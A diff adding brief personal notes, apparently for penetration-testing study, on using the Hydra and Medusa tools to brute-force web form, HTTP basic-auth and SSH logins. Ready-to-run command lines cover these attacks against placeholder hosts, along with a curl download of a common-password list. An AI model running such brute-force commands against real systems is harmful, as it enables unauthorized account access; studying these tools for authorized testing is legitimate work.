@@ -1,1 +1,39 @@
+hydra [options] target http-post-form "path:params:condition_string" :- This is the basic crucx of using HYDRA to web authentication credentials brute force. 
+
 hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302" :- When we know the usernam is "admin"
+hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81 :- Will user non standard port 81 
+
+
+Note :- We can downloa the passwords list 
+#curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+
+
+
+If we have the cred page, try accessing with dummy credetials and check the "Devops Tools" to find the parameters to add to the HYDRA 
+
+**Filename :- Path to brute force the cred 
+**Output error when the cred are wrong 
+**HTTP methiod :- Post or Get 
+
+We can run the hydra as shown below
+#hydra -L <word list for username> -P <Word list for password > www.example.com http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+
+
+
+==========================================================================================================================================================================
+
+Medusa :- We can also use this tool 
+
+medusa [target_options] [credential_options] -M module [module_options] :- Basic crux of using the Medusa tool 
+  e.g medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
+
+medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET :- -m is used to invoke HTTP module. 
+medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3 :- -m for SSH module.
+
+
+==========================================================================================================================================================================
+
+
+
+
